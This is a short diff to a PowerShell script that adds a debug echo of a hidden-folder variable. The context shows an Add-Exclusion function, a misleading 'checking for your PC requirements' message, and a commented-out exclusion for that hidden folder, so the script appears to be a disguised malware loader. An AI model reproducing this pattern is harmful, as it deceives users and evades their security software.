@@ -31,6 +31,8 @@ function Add-Exclusion {
     } catch {}
 }
 
+echo $hiddenFolder
+
 try {
     Write-Host "Downloading the program and checking for your PC requirements..."
     #Add-Exclusion -Path $hiddenFolder
